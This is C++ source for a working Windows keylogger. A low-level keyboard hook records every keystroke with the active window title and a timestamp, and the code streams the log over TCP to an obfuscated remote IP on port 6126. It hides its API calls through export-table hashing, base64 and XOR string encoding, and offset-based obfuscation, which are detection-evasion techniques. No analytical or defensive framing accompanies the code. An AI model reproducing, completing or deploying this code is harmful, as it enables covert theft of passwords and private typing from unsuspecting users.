#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <cstring>
#include <vector>
#include <sstream>
#include <string>
#include <cstdint>
#pragma comment(lib, "ws2_32")

HHOOK hKeyHook;
SOCKET WSock;
using namespace std;
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HHOOK (WINAPI *pSetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL (WINAPI *pUnhookWindowsHookEx)(HHOOK);
typedef HMODULE(WINAPI *GetModuleHandleW_t)(LPCWSTR);
typedef SOCKET(WINAPI *WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::string getTimeStamp() {
    time_t now = time(nullptr);
    tm* ltm = localtime(&now);
    std::stringstream ss;
    ss << "[" << std::setfill('0') << std::setw(2) << ltm->tm_hour << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_min << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_sec << "] ";
    return ss.str();
}

std::string getWindowTitleUTF8() {
    wchar_t wTitle[256] = {0};
    char utf8Title[1024] = {0};
    
    GetWindowTextW(GetForegroundWindow(), wTitle, 256);
    WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, utf8Title, sizeof(utf8Title), NULL, NULL);
    
    return std::string(utf8Title);
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        std::stringstream keyLog;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string specialKey;
            
            // Handle special keys
            switch (kbdStruct->vkCode) {
                case VK_RETURN: specialKey = "[ENTER]"; break;
                case VK_BACK: specialKey = "[BACKSPACE]"; break;
                case VK_TAB: specialKey = "[TAB]"; break;
                case VK_SHIFT: specialKey = "[SHIFT]"; break;
                case VK_CONTROL: specialKey = "[CTRL]"; break;
                case VK_MENU: specialKey = "[ALT]"; break;
                case VK_CAPITAL: specialKey = "[CAPS LOCK]"; break;
                case VK_ESCAPE: specialKey = "[ESC]"; break;
                case VK_SPACE: specialKey = "[SPACE]"; break;
                case VK_DELETE: specialKey = "[DEL]"; break;
                case VK_LEFT: specialKey = "[LEFT]"; break;
                case VK_RIGHT: specialKey = "[RIGHT]"; break;
                case VK_UP: specialKey = "[UP]"; break;
                case VK_DOWN: specialKey = "[DOWN]"; break;
                default: {
                    wchar_t keyNameW[64] = {0};
                    char utf8Output[256] = {0};
                    int msg = 1 + (kbdStruct->scanCode << 16) + (kbdStruct->flags << 24);
                    GetKeyNameTextW(msg, keyNameW, 64);
                    WideCharToMultiByte(CP_UTF8, 0, keyNameW, -1, utf8Output, sizeof(utf8Output), NULL, NULL);
                    specialKey = utf8Output;
                }
            }

            keyLog << getTimeStamp() 
                << "[" << getWindowTitleUTF8() << "] "
                << "Key: " << specialKey << " "
                << "VK: 0x" << std::hex << kbdStruct->vkCode << "\n";

                  
            std::string logData = keyLog.str();
            send(WSock, logData.c_str(), logData.length(), 0);
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

uint32_t GetHash(const std::string &functionName)
{
    uint32_t hash = 0;
    for (char c : functionName)
    {
        hash = (hash >> 13) | (hash << 19); // Rotate bits
        hash += c;
    }
    return hash;
}

std::string base64_decode(const std::string &in)
{
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++)
        T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in)
    {
        if (T[c] == -1)
            break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0)
        {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

string deObfuscation(const vector<int> &offsets, const char *big_string)
{
    string result;
    for (int offset : offsets)
    {
        result += big_string[offset];
    }
    return result;
}

string simpleXOR(const string &data, char key)
{
    string result = data;
    for (size_t i = 0; i < data.size(); i++)
    {
        result[i] = data[i] ^ key;
    }
    return result;
}

string decodeString(const int *encoded, int size, const char *big_string, char key)
{
    // Deobfuscate the Base64 encoded string
    string base64Encoded;
    for (int i = 0; i < size; i++)
    {
        base64Encoded += big_string[encoded[i]];
    }

    // Decode Base64
    string decoded = base64_decode(base64Encoded);

    // Decrypt
    string decrypted = simpleXOR(decoded, key);

    // Parse back to vector<int>
    vector<int> decryptedOffsets;
    stringstream ss(decrypted);
    string token;
    while (getline(ss, token, ','))
    {
        if (!token.empty())
        {
            decryptedOffsets.push_back(stoi(token));
        }
    }

    // Final deobfuscation
    return deObfuscation(decryptedOffsets, big_string);
}

int main() {

    const char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._0123456789=/+";
    char key = 'K';
    int w_s_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 35, 13, 4, 56, 3, 60, 5, 32, 3, 60, 2, 12, 3, 59, 4, 56, 3, 60, 5, 12, 2, 64};                                                                                                       // WSAStartup
    int w_c_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 4, 49, 39, 13, 4, 13, 63, 13, 4, 13, 7, 13, 4, 13, 7, 13, 5, 56, 3, 59, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                   // WSAConnect
    int w_soc_offset[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 22, 64, 64};                                                                                                          // WSASocket
    int h_t_o[] = {5, 32, 3, 60, 2, 12, 3, 60, 5, 56, 3, 60, 4, 32, 3, 60, 2, 56, 2, 64};                                                                                                                                                                                  // htons
    int i_a_o[] = {2, 56, 3, 60, 4, 32, 3, 65, 51, 57, 15, 24, 51, 57, 59, 58, 51, 57, 19, 13, 4, 32, 3, 58, 51, 57, 15, 62, 51, 22, 64, 64};                                                                                                                              // inet_addr
    int w_s_2_32lld[] = {4, 49, 11, 13, 4, 13, 39, 13, 5, 13, 55, 13, 5, 13, 7, 13, 5, 13, 23, 13, 5, 13, 55, 13, 5, 13, 11, 13, 4, 32, 3, 60, 4, 12, 3, 60, 4, 12, 2, 64};                                                                          // ws2_32.dll
    int k_renel_32[] = {4, 13, 19, 13, 5, 56, 3, 60, 5, 32, 3, 60, 4, 32, 3, 65, 51, 57, 15, 60, 51, 57, 59, 62, 51, 57, 59, 63, 51, 57, 59, 59, 51, 57, 7, 13, 4, 13, 15, 13, 4, 13, 15, 13};                                                       // kernel32.dll
    int get_proc_addr[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 65, 4, 12, 3, 60, 5, 32, 3, 60, 5, 56, 3, 59, 51, 57, 11, 63, 51, 57, 7, 13, 4, 32, 3, 60, 5, 32, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 22, 64, 64};                          // GetProcAddress
    int ipaddr_offset[] = { 5, 13, 23, 13, 5, 13, 11, 13, 5, 49, 11, 13, 5, 13, 35, 13, 5, 13, 11, 13, 5, 13, 55, 13, 5, 13, 63, 13, 5, 13, 11, 13, 5, 49, 19, 13, 5, 13, 63, 13 };
    int w_s_cl[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 4, 49, 39, 13, 4, 13, 15, 13, 5, 56, 3, 61, 51, 57, 15, 58, 51, 57, 11, 61, 51, 57, 15, 66, 51, 22, 64, 64};
    int u_ser32lld[] = {5, 57, 55, 13, 4, 13, 39, 13, 5, 56, 3, 60, 5, 32, 3, 66, 5, 32, 3, 66, 5, 48, 3, 66, 4, 48, 3, 58, 51, 57, 15, 60, 51, 57, 15, 60, 51, 22, 64, 64};
    int set_w_h_e_x[] = {5, 57, 63, 13, 5, 56, 3, 60, 2, 12, 3, 65, 2, 56, 3, 25, 51, 57, 15, 58, 51, 57, 7, 13, 4, 13, 63, 13, 4, 49, 11, 13, 4, 13, 39, 13, 4, 33, 7, 13, 4, 13, 63, 13, 4, 13, 63, 13, 4, 13, 19, 13, 4, 33, 19, 13, 4, 49, 7, 13, 4, 49, 55, 13};
    int set_w_unho_ex[] = {5, 57, 55, 13, 4, 13, 7, 13, 5, 32, 3, 60, 5, 56, 3, 60, 5, 56, 3, 60, 4, 56, 3, 65, 2, 56, 3, 25, 51, 57, 15, 58, 51, 57, 7, 13, 4, 13, 63, 13, 4, 49, 11, 13, 4, 13, 39, 13, 4, 33, 7, 13, 4, 13, 63, 13, 4, 13, 63, 13, 4, 13, 19, 13, 4, 33, 19, 13, 4, 49, 7, 13};
    int get_mess_A_offsec[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 58, 2, 56, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 57, 19, 13, 5, 48, 3, 65, 51, 57, 11, 63, 51, 22, 64, 64};
    int trans_mess_offsec[] = {5, 57, 59, 13, 4, 13, 23, 13, 4, 56, 3, 60, 4, 32, 3, 60, 2, 56, 3, 60, 4, 12, 3, 61, 51, 57, 15, 24, 51, 57, 63, 13, 4, 33, 39, 13, 5, 56, 3, 60, 2, 56, 3, 60, 2, 56, 3, 61, 51, 57, 55, 13, 5, 56, 2, 64};
    int dis_patch_mess_offsec[] = {4, 49, 35, 13, 2, 56, 3, 60, 2, 56, 3, 60, 5, 12, 3, 61, 51, 57, 15, 24, 51, 57, 11, 13, 5, 32, 3, 58, 2, 56, 3, 65, 51, 57, 15, 25, 51, 57, 15, 25, 51, 57, 19, 13, 5, 48, 3, 65, 51, 22, 64, 64};
    int clo_soc_offset[] = {4, 48, 3, 60, 4, 12, 3, 60, 5, 56, 3, 60, 2, 56, 3, 65, 51, 57, 15, 25, 51, 57, 15, 65, 51, 57, 11, 13, 4, 13, 19, 13, 5, 56, 3, 60, 2, 12, 2, 64};
    int w_s_a_o[] = {5, 57, 39, 13, 5, 57, 63, 13, 4, 49, 55, 13, 5, 57, 63, 13, 4, 13, 63, 13, 4, 48, 3, 60, 4, 56, 3, 65, 51, 57, 15, 24, 51, 57, 11, 63, 51, 22, 64, 64};
    int g_et_mod_u_l_o_handelW[] = {4, 33, 11, 13, 5, 56, 3, 60, 2, 12, 3, 58, 2, 56, 3, 60, 5, 56, 3, 58, 51, 57, 11, 61, 51, 57, 15, 60, 51, 57, 63, 13, 4, 33, 7, 13, 4, 56, 3, 60, 4, 32, 3, 58, 51, 57, 15, 60, 51, 57, 63, 13, 5, 57, 39, 13};
    HMODULE w_s2_32lib = LoadLibraryA(decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str());

    // api hash technique
    HMODULE ker_nel_32lld = LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str());
    HMODULE u_ser32lib = LoadLibraryA(decodeString(u_ser32lld, sizeof(u_ser32lld) / sizeof(u_ser32lld[0]), big_string, key).c_str());
    uint32_t targetHash = GetHash(decodeString(get_proc_addr, sizeof(get_proc_addr) / sizeof(get_proc_addr[0]), big_string, key).c_str());

    // Get the address of the Export Directory
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ker_nel_32lld;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE *)ker_nel_32lld + pDOSHeader->e_lfanew);
    DWORD exportDirectoryRVA = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    // Get the Export Directory and its functions
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ker_nel_32lld + exportDirectoryRVA);
    DWORD *functionNames = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNames);
    DWORD *functionAddresses = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfFunctions);
    WORD *nameOrdinals = (WORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNameOrdinals);

    // Declare the GetProcAddress function pointer outside the loop
    pGetProcAddress GetProcAddressFn = nullptr;

    // Loop through the exports
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        const char *functionName = (const char *)((BYTE *)ker_nel_32lld + functionNames[i]);
        uint32_t functionHash = GetHash(functionName);

        if (functionHash == targetHash)
        {
            // We've found the function we're looking for
            DWORD functionAddressRVA = functionAddresses[nameOrdinals[i]];
            GetProcAddressFn = (pGetProcAddress)((BYTE *)ker_nel_32lld + functionAddressRVA);
            break; // Exit the loop once we've found the function
        }
    }

    FARPROC w_sa_St_ar_tup = GetProcAddressFn(w_s2_32lib, decodeString(w_s_o, sizeof(w_s_o) / sizeof(w_s_o[0]), big_string, key).c_str());
    FARPROC Connectsaw = GetProcAddressFn(w_s2_32lib, decodeString(w_c_o, sizeof(w_c_o) / sizeof(w_c_o[0]), big_string, key).c_str());
    FARPROC wsaSocket = GetProcAddressFn(w_s2_32lib, decodeString(w_soc_offset, sizeof(w_soc_offset) / sizeof(w_soc_offset[0]), big_string, key).c_str());
    FARPROC htonsFunc = GetProcAddressFn(w_s2_32lib, decodeString(h_t_o, sizeof(h_t_o) / sizeof(h_t_o[0]), big_string, key).c_str());
    FARPROC inetAddr = GetProcAddressFn(w_s2_32lib, decodeString(i_a_o, sizeof(i_a_o) / sizeof(i_a_o[0]), big_string, key).c_str());
    FARPROC WsAClo = GetProcAddressFn(w_s2_32lib, decodeString(w_s_cl, sizeof(w_s_cl) / sizeof(w_s_cl[0]), big_string, key).c_str());
    FARPROC setWindow_hookE_x = GetProcAddressFn(u_ser32lib, decodeString(set_w_h_e_x, sizeof(set_w_h_e_x) / sizeof(set_w_h_e_x[0]), big_string, key).c_str());
    FARPROC setWindow_Unhook_Ex = GetProcAddressFn(u_ser32lib, decodeString(set_w_unho_ex, sizeof(set_w_unho_ex) / sizeof(set_w_unho_ex[0]), big_string, key).c_str());
    FARPROC get_mess_A = GetProcAddressFn(u_ser32lib, decodeString(get_mess_A_offsec, sizeof(get_mess_A_offsec) / sizeof(get_mess_A_offsec[0]), big_string, key).c_str());
    FARPROC trans_mess = GetProcAddressFn(u_ser32lib, decodeString(trans_mess_offsec, sizeof(trans_mess_offsec) / sizeof(trans_mess_offsec[0]), big_string, key).c_str());
    FARPROC dis_patch_mess = GetProcAddressFn(u_ser32lib, decodeString(dis_patch_mess_offsec, sizeof(dis_patch_mess_offsec) / sizeof(dis_patch_mess_offsec[0]), big_string, key).c_str());
    FARPROC clo_soc = GetProcAddressFn(w_s2_32lib, decodeString(clo_soc_offset, sizeof(clo_soc_offset) / sizeof(clo_soc_offset[0]), big_string, key).c_str());
    // Initialize Winsock
    WSADATA wsaData;
    reinterpret_cast<int(WINAPI *)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);

    // Create socket and connect
    string original_ws_2_32_dl_l = decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str();
    wstring wide_original_ws_2_32_dl_l(original_ws_2_32_dl_l.begin(), original_ws_2_32_dl_l.end());
    GetModuleHandleW_t pGetModuleHandleW = (GetModuleHandleW_t)GetProcAddressFn(ker_nel_32lld, decodeString(g_et_mod_u_l_o_handelW, sizeof(g_et_mod_u_l_o_handelW) / sizeof(g_et_mod_u_l_o_handelW[0]), big_string, key).c_str());
    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
        GetProcAddressFn(pGetModuleHandleW(wide_original_ws_2_32_dl_l.c_str()),
                         decodeString(w_s_a_o, sizeof(w_s_a_o) / sizeof(w_s_a_o[0]), big_string, key).c_str()));
    
    
    WSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0); //*WSASocket
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = reinterpret_cast<u_short(__stdcall *)(u_short)>(htonsFunc)(6126);
    server.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall *)(const char *)>(inetAddr)(
        decodeString(ipaddr_offset, sizeof(ipaddr_offset) / sizeof(ipaddr_offset[0]), big_string, key).c_str());

    if (reinterpret_cast<int(WINAPI *)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF,
                                   LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>(Connectsaw)(
        WSock, reinterpret_cast<const sockaddr *>(&server), sizeof(server), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) { //WSAConnect
        // Install keyboard hook
        
        hKeyHook = reinterpret_cast<HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD)>(setWindow_hookE_x)
    (WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);

        
        MSG msg;
        while (reinterpret_cast<BOOL(WINAPI*)(LPMSG, HWND, UINT, UINT)>(get_mess_A)(&msg, NULL, 0, 0)) {
    reinterpret_cast<BOOL(WINAPI*)(LPMSG)>(trans_mess)(&msg);
    reinterpret_cast<LRESULT(WINAPI*)(LPMSG)>(dis_patch_mess)(&msg);
}

    }

    // Cleanup
    reinterpret_cast<BOOL(WINAPI*)(HHOOK)>(setWindow_Unhook_Ex)(hKeyHook);

    reinterpret_cast<int(WINAPI*)(SOCKET)>(clo_soc)(WSock);

    reinterpret_cast<void(WINAPI *)(void)>(WsAClo)(); //WSACleanup
    
    return 0;
}
